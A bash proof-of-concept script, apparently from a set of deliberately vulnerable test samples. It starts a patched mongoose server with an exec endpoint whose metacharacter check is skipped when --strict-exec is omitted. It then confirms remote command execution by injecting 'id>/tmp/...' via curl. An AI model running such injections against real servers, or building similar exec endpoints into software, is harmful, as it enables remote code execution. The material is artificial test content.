#!/usr/bin/env bash
# PoC for 033_mongoose_C1I3S3
# Axes: C1 (single CLI flag gate) / I3 (struct dispatch) / S3 (metachar check when --strict-exec — bypass by omitting flag)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (mongoose_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/mongoose_server"
WWWROOT="/tmp/poc_033_www"
MARKER="/tmp/poc_033_marker"
PORT=18033

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
# S3 only filters when --strict-exec is passed; omitting it disables the check
echo "[*] starting mongoose_server with --exec-mode (NO --strict-exec) on port $PORT..."
"$BINARY" --port "$PORT" --root "$WWWROOT" --exec-mode &
SERVER_PID=$!
sleep 0.4

# ── trigger ────────────────────────────────────────────────────────────────────
# I3 copies cmd into exec_args_t struct then calls dispatch_exec() -> system()
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

sleep 0.2

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without --exec-mode ──────────────────────
echo "[*] verifying gate: endpoint must be absent without --exec-mode..."
NEG_PORT=19033
"$BINARY" --port "$NEG_PORT" --root "$WWWROOT" &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
